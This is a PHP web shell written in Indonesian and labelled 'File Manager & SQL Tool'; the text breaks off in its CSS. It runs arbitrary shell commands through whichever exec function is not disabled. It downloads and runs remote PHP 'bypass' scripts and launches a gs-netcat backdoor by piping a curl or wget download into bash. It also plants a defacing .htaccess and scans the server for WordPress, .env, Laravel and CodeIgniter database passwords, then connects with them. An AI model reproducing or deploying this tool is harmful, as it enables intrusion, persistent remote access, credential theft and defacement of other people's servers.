<?php
// Enable error reporting for debugging (remove in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set timezone to prevent warnings (PHP 5 compatible)
if (!ini_get('date.timezone')) {
    date_default_timezone_set('UTC');
}

session_start();
$stored_password_hash = md5("password"); // ganti password

// === LOGIN ===
if (!isset($_SESSION['loggedin'])) {
    if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (md5($_POST['password']) === $stored_password_hash) {
            $_SESSION['loggedin'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            echo "Password salah!";
        }
    }
    echo '<form method="POST">
            <input type="password" name="password" placeholder="Password">
            <input type="submit" value="Login">
          </form>';
    exit;
}

// === LOGOUT ===
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit;
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$dir = realpath($dir);

$msg = '';

// Output untuk mode bypass
$bypass_output = '';
$gs_output = '';

// === UPLOAD FROM URL ===
if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
    $url = trim($_POST['upload_url']);
    $basename = basename(parse_url($url, PHP_URL_PATH));
    $output_name = isset($_POST['output_name']) && $_POST['output_name'] !== '' ? basename($_POST['output_name']) : $basename;
    if ($output_name === '' || $output_name === '.' || $output_name === '..') {
        $msg = "URL tidak valid atau nama file output tidak ditemukan!";
    } else {
        $target = $dir . "/" . $output_name;
        $data = @file_get_contents($url);
        if ($data === false) {
            $msg = "Gagal download dari URL!";
        } else {
            $w = @file_put_contents($target, $data);
            if ($w === false) {
                $msg = "Gagal simpan file dari URL!";
            } else {
                $msg = "Upload dari URL berhasil: " . htmlspecialchars($output_name);
            }
        }
    }
}

// === BYPASS BUTTONS HANDLER ===
if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
    $url = trim($_POST['bypass_url']);
    if ($url !== '') {
        $allowed = array(
            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/1.php',
            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/2.php',
            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/3.php',
            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/4.php',
            'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/5.php',
        );
        if (!in_array($url, $allowed, true)) {
            $bypass_output = "URL tidak diizinkan.";
        } else {
            $data = @file_get_contents($url);
            if ($data === false) {
                $bypass_output = "Gagal mengambil konten dari URL: " . htmlspecialchars($url);
            } else {
                // Simpan di direktori saat ini
                $baseName = basename(parse_url($url, PHP_URL_PATH));
                if ($baseName === '' || $baseName === false) { $baseName = 'remote.php'; }
                $tmpFile = rtrim($dir, '/').'/__bypass_run_' . $baseName;
                if (@file_put_contents($tmpFile, $data) === false) {
                    $bypass_output = "Gagal menulis file di direktori saat ini.";
                } else {
                    // Coba eksekusi via PHP CLI agar parse error tidak menghentikan script utama
                    $phpBin = 'php';
                    $which = @shell_exec('command -v php 2>/dev/null');
                    if ($which) { $phpBin = trim($which); }
                    $cliCmd = $phpBin . ' ' . escapeshellarg($tmpFile);
                    $out = exec_cmd($cliCmd, $dir);
                    if (trim($out) === '') {
                        $bypass_output = '[Tidak ada output]';
                    } else {
                        $bypass_output = $out;
                    }
                    // Hapus file setelah eksekusi
                    @unlink($tmpFile);
                }
            }
        }
    }
}

// === GS-NETCAT COMMAND BUTTONS ===
if (isset($_POST['gs_cmd'])) {
    $cmdKey = $_POST['gs_cmd'];
    $commands = array(
        'curl_gs_netcat' => 'bash -c "$(curl -fsSL https://gsocket.io/y)"',
        'wget_gs_netcat' => 'bash -c "$(wget -qO- https://gsocket.io/y)"',
        'gs_443' => 'GS_PORT=443 bash -c "$(curl -fsSL https://gsocket.io/y)"',
        'gs_80'  => 'GS_PORT=80 bash -c "$(wget -fsSL https://gsocket.io/y)"',
        'gs_113' => 'GS_PORT=113 bash -c "$(curl -fsSL https://gsocket.io/y)"',
    );
    if (isset($commands[$cmdKey])) {
        $run = $commands[$cmdKey];
        $gs_output = exec_cmd($run, $dir);
    } else {
        $gs_output = 'Unknown command key';
    }
}

// === CREATE ===
if (!empty($_FILES['file']['name'])) {
    $target = $dir . "/" . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = "Upload berhasil!";
    } else {
        $msg = "Upload gagal!";
    }
}
if (isset($_POST['newfolder']) && $_POST['newfolder'] !== '') {
    $newFolder = $dir . DIRECTORY_SEPARATOR . basename($_POST['newfolder']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder);
        $msg = "Folder berhasil dibuat!";
    }
}

// Create file
if (isset($_POST['newfile']) && $_POST['newfile'] !== '') {
    $newFileName = basename($_POST['newfile']);
    if ($newFileName === '' || $newFileName === '.' || $newFileName === '..') {
        $msg = "Nama file tidak valid!";
    } else {
        $newFilePath = $dir . DIRECTORY_SEPARATOR . $newFileName;
        if (file_exists($newFilePath)) {
            $msg = "File sudah ada!";
        } else {
            $initial = isset($_POST['newfile_content']) ? (string)$_POST['newfile_content'] : '';
            $w = @file_put_contents($newFilePath, $initial);
            if ($w === false) {
                $msg = "Gagal membuat file!";
            } else {
                $msg = "File berhasil dibuat!";
            }
        }
    }
}

// === UPDATE ===
if (isset($_POST['rename']) && isset($_POST['oldname'])) {
    $oldPath = $dir . DIRECTORY_SEPARATOR . $_POST['oldname'];
    $newPath = $dir . DIRECTORY_SEPARATOR . $_POST['rename'];
    if (rename($oldPath, $newPath)) {
        $msg = "Rename sukses!";
    } else {
        $msg = "Rename gagal!";
    }
}
if (isset($_POST['editfile']) && isset($_POST['filename'])) {
    $filePath = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
    file_put_contents($filePath, $_POST['editfile']);
    $msg = "File berhasil diupdate!";
}

// === DELETE ===
if (isset($_POST['delete'])) {
    $target = $dir . DIRECTORY_SEPARATOR . $_POST['delete'];
    if (is_dir($target)) {
        if (rmdir($target)) {
            $msg = "Folder dihapus!";
        } else {
            $msg = "Gagal hapus folder!";
        }
    } else {
        if (unlink($target)) {
            $msg = "File dihapus!";
        } else {
            $msg = "Gagal hapus file!";
        }
    }
}

// === CHMOD ===
if (isset($_POST['chmod_target']) && isset($_POST['chmod_value'])) {
    $target = $dir . DIRECTORY_SEPARATOR . $_POST['chmod_target'];
    $perm = $_POST['chmod_value'];
    if (@chmod($target, octdec($perm))) {
        $msg = "Chmod $perm ke " . htmlspecialchars($_POST['chmod_target']) . " sukses!";
    } else {
        $msg = "Gagal chmod $perm ke " . htmlspecialchars($_POST['chmod_target']);
    }
}

// === HTACCESS CREATE (simple) ===
if (isset($_POST['create_htaccess'])) {
    $default_ht = <<<HT
<FilesMatch ".*\.(cgi|pl|py|pyc|pyo|php3|php4|php6|pcgi|inc|php|phtml|phar|phpt|shtml|sh|py|exe|html|htm)">
Order Allow,Deny
Deny from all
</FilesMatch>

Options -Indexes

<FilesMatch '^(index.php|sitemap.xml|robots.txt)$'>
 Order allow,deny
 Allow from all
</FilesMatch>

ErrorDocument 403 '<center><img src="https://media.tenor.com/WYQnYdWsmrkAAAAM/hahaha-lol.gif"></img> <h3>IN YOUR FACE</font>'
HT;

    $ht_content = isset($_POST['ht_content']) ? $_POST['ht_content'] : $default_ht;
    $ht_exclude = isset($_POST['ht_exclude']) ? trim($_POST['ht_exclude']) : '';

    $allow_block = '';
    if ($ht_exclude !== '') {
        // split by comma or whitespace
        $parts = preg_split('/[\s,]+/', $ht_exclude);
        $clean = array();
        foreach ($parts as $p) {
            $p = trim($p);
            if ($p === '') continue;
            // support wildcard * => .* , escape other chars
            $p = str_replace('.', '\\.', $p);
            $p = str_replace('*', '.*', $p);
            $clean[] = $p;
        }
        if (!empty($clean)) {
            $allow_block = "\n\n# Allow exceptions\n<FilesMatch \"^(" . implode('|', $clean) . ")\$\">\n Order allow,deny\n Allow from all\n</FilesMatch>\n";
        }
    }

    $final = $ht_content . $allow_block;
    $target = $dir . DIRECTORY_SEPARATOR . '.htaccess';
    if (file_exists($target)) {
        $bak = $target . '.bak.' . time();
        @copy($target, $bak);
    }
    $w = @file_put_contents($target, $final);
    if ($w === false) {
        $msg = 'Failed to write .htaccess (permission denied)';
    } else {
        $msg = '.htaccess created at ' . $target;
    }
}

// === SCAN DATABASE CONFIG (PHP 5 Compatible) ===
function scan_configs($root, $maxFiles=2000, $maxBytes=262144) {
    $root = realpath($root);
    if (!$root || !is_dir($root)) return array('err'=>'Root path invalid','items'=>array());
    $skipDirs = array('.git','node_modules','vendor','storage','cache','logs','tmp','.idea','.vscode');
    $extAllow = array('php','env','ini','yaml','yml','json','config');
    $items = array();
    $count = 0;

    // Safe manual traversal to avoid exceptions on unreadable directories
    $stack = array($root);
    while (!empty($stack) && $count < $maxFiles) {
        $dirPath = array_pop($stack);
        if (!@is_readable($dirPath) || !@is_executable($dirPath)) continue;
        $entries = @scandir($dirPath);
        if ($entries === false) continue;
        foreach ($entries as $entry) {
            if ($count >= $maxFiles) break;
            if ($entry === '.' || $entry === '..') continue;
            $path = $dirPath . DIRECTORY_SEPARATOR . $entry;
            if (@is_link($path)) continue;
            if (@is_dir($path)) {
                // Skip any directory segment that is in skipDirs
                $rel = ltrim(str_replace($root, '', $path), DIRECTORY_SEPARATOR);
                $skip = false;
                if ($rel !== '') {
                    $parts = explode(DIRECTORY_SEPARATOR, $rel);
                    foreach ($parts as $seg) { if ($seg !== '' && in_array($seg, $skipDirs, true)) { $skip = true; break; } }
                }
                if ($skip) continue;
                $stack[] = $path;
                continue;
            }
            if (!@is_file($path)) continue;
            if (@filesize($path) > $maxBytes) continue;
            $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
            if ($ext !== '' && !in_array($ext, $extAllow, true)) continue;
            $src = @file_get_contents($path);
            if ($src === false) continue;
            $count++;

            $base = basename($path);
            $found = array('file'=>$path,'host'=>null,'user'=>null,'pass'=>null,'db'=>null,'hint'=>null);

        // WordPress wp-config.php
        if (stripos($base,'wp-config.php') !== false || strpos($src,"'DB_NAME'") !== false || strpos($src,'"DB_NAME"') !== false) {
            $p = array();
            if (preg_match("/define\\(['\"]DB_NAME['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['db'] = $m[1];
            if (preg_match("/define\\(['\"]DB_USER['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['user'] = $m[1];
            if (preg_match("/define\\(['\"]DB_PASSWORD['\"],\\s*['\"]([^'\"]*)['\"]\\)/", $src, $m)) $p['pass'] = $m[1];
            if (preg_match("/define\\(['\"]DB_HOST['\"],\\s*['\"]([^'\"]+)['\"]\\)/", $src, $m)) $p['host'] = $m[1];
            if (!empty($p)) {
                $found = array_merge($found, $p);
                $found['hint'] = 'WordPress';
                $items = array_merge($items, array($found));
                continue;
            }
        }

        // .env style
        if (strpos($src,'DB_HOST=') !== false || strpos($src,'DB_DATABASE=') !== false) {
            $p = array();
            if (preg_match('/DB_HOST=([^\r\n#]+)/', $src, $m)) $p['host'] = trim($m[1]);
            if (preg_match('/DB_DATABASE=([^\r\n#]+)/', $src, $m)) $p['db'] = trim($m[1]);
            if (preg_match('/DB_USERNAME=([^\r\n#]+)/', $src, $m)) $p['user'] = trim($m[1]);
            if (preg_match('/DB_PASSWORD=([^\r\n#]*)/', $src, $m)) $p['pass'] = trim($m[1]);
            if (!empty($p)) {
                $found = array_merge($found, $p);
                $found['hint'] = '.env';
                $items = array_merge($items, array($found));
                continue;
            }
        }

        // Laravel config/database.php (mysql array)
        if (stripos($path, 'config'.DIRECTORY_SEPARATOR.'database.php') !== false || strpos($src,"'mysql'") !== false) {
            $p = array();
            if (preg_match("/'host'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['host'] = $m[1];
            if (preg_match("/'database'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['db'] = $m[1];
            if (preg_match("/'username'\\s*=>\\s*'([^']+)'/", $src, $m)) $p['user'] = $m[1];
            if (preg_match("/'password'\\s*=>\\s*'([^']*)'/", $src, $m)) $p['pass'] = $m[1];
            if (!empty($p)) {
                $found = array_merge($found, $p);
                $found['hint'] = 'Laravel config';
                $items = array_merge($items, array($found));
                continue;
            }
        }

        // CodeIgniter database.php
        if (stripos($path,'database.php') !== false && strpos($src,"\$"."db['default']") !== false) {
            $p = array();
            if (preg_match("/\\\$db\\['default'\\]\\['hostname'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['host'] = $m[1];
            if (preg_match("/\\\$db\\['default'\\]\\['database'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['db'] = $m[1];
            if (preg_match("/\\\$db\\['default'\\]\\['username'\\]\\s*=\\s*'([^']+)'/", $src, $m)) $p['user'] = $m[1];
            if (preg_match("/\\\$db\\['default'\\]\\['password'\\]\\s*=\\s*'([^']*)'/", $src, $m)) $p['pass'] = $m[1];
            if (!empty($p)) {
                $found = array_merge($found, $p);
                $found['hint'] = 'CodeIgniter';
                $items = array_merge($items, array($found));
                continue;
            }
        }

        // Generic mysqli_connect("host","user","pass","db")
        if (strpos($src,'mysqli_connect(') !== false) {
            if (preg_match('/mysqli_connect\\((["\'])(.*?)\\1\\s*,\\s*(["\'])(.*?)\\3\\s*,\\s*(["\'])(.*?)\\5\\s*,\\s*(["\'])(.*?)\\7/', $src, $m)) {
                $items = array_merge($items, array(array('file'=>$path,'host'=>$m[2],'user'=>$m[4],'pass'=>$m[6],'db'=>$m[8],'hint'=>'mysqli_connect')));
                continue;
            }
        }
    }
    
    }

    // de-duplicate by (host|user|db) + file
    $uniq = array();
    $res = array();
    foreach ($items as $it) {
        $key = (isset($it['file']) ? $it['file'] : '')."|".(isset($it['host']) ? $it['host'] : '')."|".(isset($it['user']) ? $it['user'] : '')."|".(isset($it['db']) ? $it['db'] : '');
        if (isset($uniq[$key])) continue;
        $uniq[$key] = 1;
        $res = array_merge($res, array($it));
    }
    return array('err'=>null,'items'=>$res);
}

// === MINI SQL MANAGER (PHP 5 Compatible) ===
function db_connect($host, $user, $pass, $db) {
    $conn = @mysql_connect($host, $user, $pass);
    if (!$conn) return false;
    if (!@mysql_select_db($db, $conn)) {
        mysql_close($conn);
        return false;
    }
    return $conn;
}

function db_query($conn, $sql) {
    $result = mysql_query($sql, $conn);
    if (!$result) return false;
    return $result;
}

function db_fetch_all($result) {
    $rows = array();
    while ($row = mysql_fetch_assoc($result)) {
        $rows = array_merge($rows, array($row));
    }
    return $rows;
}

function db_get_tables($conn, $db) {
    $result = mysql_query("SHOW TABLES FROM `$db`", $conn);
    $tables = array();
    while ($row = mysql_fetch_row($result)) {
        $tables = array_merge($tables, array($row[0]));
    }
    return $tables;
}

function db_get_table_structure($conn, $table) {
    $result = mysql_query("DESCRIBE `$table`", $conn);
    return db_fetch_all($result);
}

// === TERMINAL HELPERS ===
function exec_cmd($cmd, $cwd) {
    $disabled = explode(',', str_replace(' ', '', ini_get('disable_functions')));
    $output = "";

    // Build command sesuai OS
    if (strncasecmp(PHP_OS, 'WIN', 3) == 0) {
        $fullCmd = "cd /d " . escapeshellarg($cwd) . " && cmd /c " . $cmd . " 2>&1";
    } else {
        $fullCmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
    }

    // shell_exec
    if (!in_array('shell_exec', $disabled) && function_exists('shell_exec')) {
        $output = shell_exec($fullCmd);
        if ($output !== null) return $output;
    }

    // exec
    if (!in_array('exec', $disabled) && function_exists('exec')) {
        $res = array();
        exec($fullCmd, $res);
        return implode("\n", $res);
    }

    // system
    if (!in_array('system', $disabled) && function_exists('system')) {
        ob_start();
        system($fullCmd);
        return ob_get_clean();
    }

    // passthru
    if (!in_array('passthru', $disabled) && function_exists('passthru')) {
        ob_start();
        passthru($fullCmd);
        return ob_get_clean();
    }

    // popen
    if (!in_array('popen', $disabled) && function_exists('popen')) {
        $handle = popen($fullCmd, 'r');
        $res = '';
        while (!feof($handle)) {
            $res .= fgets($handle);
        }
        pclose($handle);
        return $res;
    }

    return "Tidak ada fungsi eksekusi yang tersedia (semua disable).";
}

$terminal_output = "";
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $terminal_output = exec_cmd($cmd, $dir);
}

// === SCAN DATABASE CONFIG ===
$scan_msg = '';
$scan_items = array();
$scan_dur = null;

if (isset($_POST['scan_db'])) {
    // Increase memory limit temporarily for scanning
    $old_memory_limit = ini_get('memory_limit');
    ini_set('memory_limit', '256M');
    set_time_limit(300); // 5 minutes timeout
    
    $scan_start = microtime(true);
    $scan_path = isset($_POST['scan_path']) ? $_POST['scan_path'] : $dir;
    $scan_limit = max(100, min(10000, (int)(isset($_POST['scan_limit']) ? $_POST['scan_limit'] : 2000)));
    $scan_bytes = max(65536, min(1048576, (int)(isset($_POST['scan_bytes']) ? $_POST['scan_bytes'] : 262144)));
    
    // Validate path
    if (!is_readable($scan_path)) {
        $scan_msg = 'Path is not readable or does not exist';
    } else {
        $res = scan_configs($scan_path, $scan_limit, $scan_bytes);
        $scan_dur = microtime(true) - $scan_start;
        if (!empty($res['err'])) {
            $scan_msg = $res['err'];
        } else {
            $scan_items = $res['items'];
        }
    }
    
    // Restore original memory limit
    ini_set('memory_limit', $old_memory_limit);
}

// Handle apply from scan results: try to connect using selected credentials
if (isset($_POST['apply_scan'])) {
    $try_host = isset($_POST['apply_host']) ? $_POST['apply_host'] : 'localhost';
    $try_user = isset($_POST['apply_user']) ? $_POST['apply_user'] : '';
    $try_pass = isset($_POST['apply_pass']) ? $_POST['apply_pass'] : '';
    $try_db   = isset($_POST['apply_db']) ? $_POST['apply_db'] : '';

    $try_conn = db_connect($try_host, $try_user, $try_pass, $try_db);
    if ($try_conn) {
        $db_conn = $try_conn;
    // persist credentials in session so SQL manager can reuse
    $_SESSION['db_cred'] = array('host'=>$try_host,'user'=>$try_user,'pass'=>$try_pass,'db'=>$try_db);
    // signal we should open the SQL manager after apply
    $_SESSION['db_auto_switch'] = 1;
    $db_error = 'Connected successfully to ' . htmlspecialchars($try_host) . '/' . htmlspecialchars($try_db);
    $db_tables = db_get_tables($db_conn, $try_db);
    } else {
        $db_error = 'Auto-connect failed: ' . mysql_error();
    }
}

// === MINI SQL MANAGER LOGIC ===
// Determine mode; default to 'files'.
if (isset($_GET['mode'])) {
    $mode = $_GET['mode'];
} else {
    // Only auto-switch to SQL manager if an explicit apply_scan just occurred (session flag).
    if (isset($_SESSION['db_auto_switch']) && $_SESSION['db_auto_switch'] && isset($_SESSION['db_cred']) && !empty($_SESSION['db_cred'])) {
        $mode = 'sql';
        unset($_SESSION['db_auto_switch']);
    } else {
        $mode = 'files';
    }
}

$db_conn = null;
$db_error = '';
$db_result = array();
$db_query = '';
$db_tables = array();
$db_current_table = '';

if ($mode === 'sql') {
    // if session credentials exist, attempt connection (idempotent)
    if (!$db_conn && isset($_SESSION['db_cred']) && !empty($_SESSION['db_cred'])) {
        $c = $_SESSION['db_cred'];
        $db_conn = db_connect($c['host'], $c['user'], $c['pass'], $c['db']);
        if ($db_conn) {
            $db_tables = db_get_tables($db_conn, $c['db']);
        }
    }
    
    // Handle database connection
    if (isset($_POST['db_connect'])) {
        $db_host = isset($_POST['db_host']) ? $_POST['db_host'] : 'localhost';
        $db_user = isset($_POST['db_user']) ? $_POST['db_user'] : '';
        $db_pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
        $db_name = isset($_POST['db_name']) ? $_POST['db_name'] : '';
        
        $db_conn = db_connect($db_host, $db_user, $db_pass, $db_name);
        if (!$db_conn) {
            $db_error = 'Connection failed: ' . mysql_error();
        } else {
            // store successful manual creds in session so subsequent actions reuse them
            $_SESSION['db_cred'] = array('host'=>$db_host,'user'=>$db_user,'pass'=>$db_pass,'db'=>$db_name);
            $db_tables = db_get_tables($db_conn, $db_name);
        }
    }
    
    // CRUD: Delete row
    if (isset($_POST['delete_row']) && $db_conn && isset($_POST['pk'])) {
        $pk = @unserialize(base64_decode($_POST['pk']));
        $tbl = isset($_POST['table']) ? $_POST['table'] : (isset($_GET['table']) ? $_GET['table'] : '');
        if ($pk && $tbl) {
            $where = array();
            foreach ($pk as $col=>$val) {
                $where[] = "`" . mysql_real_escape_string($col) . "` = '" . mysql_real_escape_string($val) . "'";
            }
            $q = "DELETE FROM `" . mysql_real_escape_string($tbl) . "` WHERE " . implode(' AND ', $where) . " LIMIT 1";
            $r = @mysql_query($q, $db_conn);
            if ($r) $db_error = 'Row deleted successfully'; else $db_error = 'Delete failed: ' . mysql_error();
        }
    }

    // CRUD: Duplicate row
    if (isset($_POST['duplicate_row']) && $db_conn && isset($_POST['pk'])) {
        $pk = @unserialize(base64_decode($_POST['pk']));
        $tbl = isset($_POST['table']) ? $_POST['table'] : (isset($_GET['table']) ? $_GET['table'] : '');
        if ($pk && $tbl) {
            // fetch the row
            $where = array();
            foreach ($pk as $col=>$val) $where[] = "`" . mysql_real_escape_string($col) . "` = '" . mysql_real_escape_string($val) . "'";
            $sel = @mysql_query("SELECT * FROM `" . mysql_real_escape_string($tbl) . "` WHERE " . implode(' AND ', $where) . " LIMIT 1", $db_conn);
            if ($sel) {
                $row = mysql_fetch_assoc($sel);
                mysql_free_result($sel);
                if ($row) {
                    // remove AUTO_INCREMENT fields if any
                    $structure = db_get_table_structure($db_conn, $tbl);
                    foreach ($structure as $col) {
                        if (isset($col['Extra']) && stripos($col['Extra'], 'auto_increment') !== false) {
                            unset($row[$col['Field']]);
                        }
                    }
                    $cols = array(); $vals = array();
                    foreach ($row as $c=>$v) { $cols[] = "`".mysql_real_escape_string($c)."`"; $vals[] = "'".mysql_real_escape_string($v)."'"; }
                    $ins = "INSERT INTO `" . mysql_real_escape_string($tbl) . "` (" . implode(',', $cols) . ") VALUES (" . implode(',', $vals) . ")";
                    $ir = @mysql_query($ins, $db_conn);
                    if ($ir) $db_error = 'Row duplicated successfully'; else $db_error = 'Duplicate failed: ' . mysql_error();
                }
            }
        }
    }

    // CRUD: Update row (from edit form)
    if (isset($_POST['update_row']) && $db_conn && isset($_POST['pk']) && isset($_POST['fields']) && isset($_POST['table'])) {
        $pk = @unserialize(base64_decode($_POST['pk']));
        $tbl = $_POST['table'];
        $fields = $_POST['fields'];
        if ($pk && $tbl && is_array($fields)) {
            $sets = array();
            foreach ($fields as $col=>$val) {
                $sets[] = "`".mysql_real_escape_string($col)."`='".mysql_real_escape_string($val)."'";
            }
            $where = array();
            foreach ($pk as $col=>$val) $where[] = "`" . mysql_real_escape_string($col) . "` = '" . mysql_real_escape_string($val) . "'";
            $q = "UPDATE `" . mysql_real_escape_string($tbl) . "` SET " . implode(',', $sets) . " WHERE " . implode(' AND ', $where) . " LIMIT 1";
            $r = @mysql_query($q, $db_conn);
            if ($r) $db_error = 'Row updated successfully'; else $db_error = 'Update failed: ' . mysql_error();
        }
    }

    // CRUD: Insert row
    if (isset($_POST['insert_row']) && $db_conn && isset($_POST['table']) && isset($_POST['fields'])) {
        $tbl = $_POST['table'];
        $fields = $_POST['fields'];
        if ($tbl && is_array($fields)) {
            $cols = array(); $vals = array();
            foreach ($fields as $c => $v) {
                $cols[] = "`" . mysql_real_escape_string($c) . "`";
                $vals[] = "'" . mysql_real_escape_string($v) . "'";
            }
            if (!empty($cols)) {
                $insq = "INSERT INTO `" . mysql_real_escape_string($tbl) . "` (" . implode(',', $cols) . ") VALUES (" . implode(',', $vals) . ")";
                $ir = @mysql_query($insq, $db_conn);
                if ($ir) $db_error = 'Row inserted successfully'; else $db_error = 'Insert failed: ' . mysql_error();
            }
        }
    }

    // Handle SQL query execution
    if (isset($_POST['execute_query']) && $db_conn) {
        $db_query = isset($_POST['sql_query']) ? $_POST['sql_query'] : '';
        if (!empty($db_query)) {
            $result = db_query($db_conn, $db_query);
            if ($result === false) {
                $db_error = 'Query failed: ' . mysql_error();
            } elseif ($result === true) {
                $db_error = 'Query executed successfully';
            } else {
                $db_result = db_fetch_all($result);
                mysql_free_result($result);
            }
        }
    }
    
    // View a table (with pagination)
    if (isset($_GET['table']) && $db_conn) {
        $db_current_table = $_GET['table'];
    // rows per page (support both 'per' and legacy defaults)
    $tbl_per_page = isset($_GET['per']) ? max(1, min(200, intval($_GET['per']))) : 50;
    $tbl_page = isset($_GET['tblpage']) ? max(1, intval($_GET['tblpage'])) : (isset($_GET['p']) ? max(1,intval($_GET['p'])) : 1);
    $offset = ($tbl_page - 1) * $tbl_per_page;
        // support optional ordering
        $order_by = '';
        if (isset($_GET['sort'])) {
            $sort = preg_replace('/[^a-zA-Z0-9_]/', '', $_GET['sort']);
            $dir = (isset($_GET['dir']) && strtolower($_GET['dir']) === 'desc') ? 'DESC' : 'ASC';
            if ($sort !== '') {
                $order_by = " ORDER BY `" . mysql_real_escape_string($sort) . "` " . $dir;
            }
        }
        $q = "SELECT SQL_CALC_FOUND_ROWS * FROM `" . mysql_real_escape_string($db_current_table) . "`" . $order_by . " LIMIT " . intval($offset) . "," . intval($tbl_per_page);
        $res = @mysql_query($q, $db_conn);
        if ($res) {
            $db_result = db_fetch_all($res);
            mysql_free_result($res);
            $found = @mysql_query("SELECT FOUND_ROWS() AS cnt", $db_conn);
            if ($found) {
                $fr = mysql_fetch_assoc($found);
                $total_rows = isset($fr['cnt']) ? intval($fr['cnt']) : count($db_result);
                mysql_free_result($found);
            } else {
                $total_rows = count($db_result);
            }
        } else {
            $db_error = 'Failed to read table: ' . mysql_error();
        }
        // also fetch structure
        $table_structure = db_get_table_structure($db_conn, $db_current_table);
    }

    // Export CSV
    if (isset($_GET['export']) && $_GET['export'] === 'csv' && isset($_GET['table']) && $db_conn) {
        $t = $_GET['table'];
        header('Content-Type: text/csv');
        header('Content-Disposition: attachment; filename="' . $t . '.csv"');
        $out = fopen('php://output', 'w');
        $res = mysql_query("SELECT * FROM `" . mysql_real_escape_string($t) . "`", $db_conn);
        if ($res) {
            $first = true;
            while ($row = mysql_fetch_assoc($res)) {
                if ($first) { fputcsv($out, array_keys($row)); $first = false; }
                fputcsv($out, array_values($row));
            }
            mysql_free_result($res);
        }
        fclose($out);
        exit;
    }
    
    // Handle table selection: ensure structure is available but do NOT overwrite $db_result (rows)
    if (isset($_GET['table']) && $db_conn) {
        $db_current_table = $_GET['table'];
        $table_structure = db_get_table_structure($db_conn, $db_current_table);
        // do not assign $db_result here — it should contain fetched rows from the SELECT query above
    }
    
    // Handle disconnect
    if (isset($_POST['db_disconnect'])) {
        if ($db_conn) {
            mysql_close($db_conn);
            $db_conn = null;
        }
        $db_error = '';
        $db_result = array();
        $db_query = '';
        $db_tables = array();
        $db_current_table = '';
    // clear stored credentials
    if (isset($_SESSION['db_cred'])) unset($_SESSION['db_cred']);
    }
}

// Handle scan mode
$scan_result = null;
$scan_msg = '';
$scan_dur = null;

if ($mode === 'scan') {
    if (isset($_POST['scan_configs'])) {
        $scan_path = isset($_POST['scan_path']) ? $_POST['scan_path'] : getcwd();
        $scan_max_files = isset($_POST['max_files']) ? (int)$_POST['max_files'] : 2000;
        $scan_max_bytes = isset($_POST['max_bytes']) ? (int)$_POST['max_bytes'] : 262144;
        
        $start_time = microtime(true);
        $scan_result = scan_configs($scan_path, $scan_max_files, $scan_max_bytes);
        $scan_dur = microtime(true) - $start_time;
        
        if (isset($scan_result['err'])) {
            $scan_msg = $scan_result['err'];
        }
    }
}

// cek disable functions utk ditampilkan
$disabled_funcs = ini_get("disable_functions");
if (!$disabled_funcs) {
    $disabled_funcs = "None";
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager & SQL Tool</title>
    <style>
        /* Base */
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial; background:#0b0f14; margin:0; }
        .container { max-width:1100px; margin:0 auto; padding:16px; }
        .header { display:flex; align-items:center; justify-content:space-between; padding:14px 18px; border-radius:10px; background:#071018; border:1px solid rgba(255,255,255,0.03); margin-bottom:16px; }
        .header h1 { font-size:1.4rem; font-weight:600; color:#e6eef8; }

        .nav-tabs { display:flex; gap:8px; margin-bottom:16px; }
        .nav-tab {
            padding:10px 16px; border-radius:8px; text-decoration:none; color:#bcd3ff; background:transparent;
            border:1px solid transparent; font-weight:500; transition:all .12s ease;
        }
        .nav-tab:hover { transform:translateY(-1px); box-shadow:0 6px 18px rgba(59,130,246,0.06); }
        .nav-tab.active { background:rgba(59,130,246,0.12); color:#dff0ff; border-color:rgba(59,130,246,0.2); }

        .logout-btn { background:#ef4444; color:white; padding:8px 12px; border-radius:8px; text-decoration:none; }
        .logout-btn:hover { filter:brightness(.95); }

        .card { background:#071420; border:1px solid rgba(255,255,255,0.03); border-radius:10px; padding:16px; margin-bottom:14px; }
        .card h3 { color:#e6eef8; margin-bottom:12px; font-size:1.05rem; }

        .server-info { background:linear-gradient(180deg,#071420,#06121a); border:1px solid rgba(255,255,255,0.03); padding:12px; border-radius:10px; color:#cfe6ff; }
        .server-info strong { color:#e6eef8; }

        .btn { background:#2563eb; color:white; padding:8px 12px; border-radius:8px; border:none; cursor:pointer; display:inline-block; text-decoration:none; }
        .btn:hover { background:#1e40af; }
        .btn-danger { background:#ef4444; }
        .btn-success { background:#10b981; }

        .form-group { margin-bottom:12px; }
        label { display:block; margin-bottom:6px; color:#a9c0e8; font-weight:600; }
        .form-control { width:100%; padding:10px 12px; border-radius:8px; background:#03101a; color:#dbe7ff; border:1px solid rgba(255,255,255,0.03); }
        .form-control:focus { outline:none; box-shadow:0 6px 20px rgba(59,130,246,0.06); border-color:rgba(59,130,246,0.28); }

